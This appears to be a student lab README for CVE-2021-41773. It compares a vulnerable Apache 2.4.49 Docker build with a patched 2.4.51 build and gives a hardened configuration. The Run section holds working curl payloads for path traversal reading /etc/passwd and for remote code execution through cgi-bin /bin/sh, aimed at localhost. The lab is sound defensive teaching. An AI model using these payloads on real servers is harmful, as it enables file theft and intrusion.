# CVE-2021-41773 — build files

Manual, "What Students Submit" item 4: *a folder with your fixes*. This is it — the
two builds that were compared side by side, plus the config that acts as the
independent second layer.

| Folder | Base image | Port | Purpose |
| --- | --- | --- | --- |
| `vulnerable/` | `vulhub/httpd:2.4.49` | 8080 | reproduction: file read + CGI RCE |
| `fixed/` | `httpd:2.4.51` | 8081 | same lab config, patched release only |

The two Dockerfiles differ in exactly one line — the `FROM` tag — so any behaviour
change is attributable to the version, not to a configuration difference. That is
what makes the before/after table in the report a controlled comparison.

## Run

```bash
cd vulnerable && docker compose up -d --build     # 8080
cd ../fixed   && docker compose up -d --build     # 8081
```

```bash
# file read (vulnerable)
curl -s --path-as-is 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' | head -3

# RCE (vulnerable)
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; id' \
     'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'

# same requests against the fixed build -> 400 Bad Request
curl -s -o /dev/null -w '%{http_code}\n' --path-as-is \
     'http://127.0.0.1:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

## Stop

```bash
cd vulnerable && docker compose down
cd ../fixed   && docker compose down
```

## The configuration layer

The lab intentionally sets `<Directory /> … Require all granted` and loads
`mod_cgi`, because without them the vulnerability cannot be demonstrated. On a
**stock** 2.4.49 image — `Require all denied`, no CGI — the same payload returns
`403`, which is the point of the third row in the report's verification table:
patching the binary and hardening the config are two independent controls, and
either one alone stops this request.

Production form of the same file:

```apache
<Directory />
    AllowOverride None
    Require all denied
</Directory>
#LoadModule cgi_module modules/mod_cgi.so   # only if the app really needs CGI
```

Full narration, evidence and the root-cause analysis: `../docs/CVE-2021-41773-walkthrough.md`.
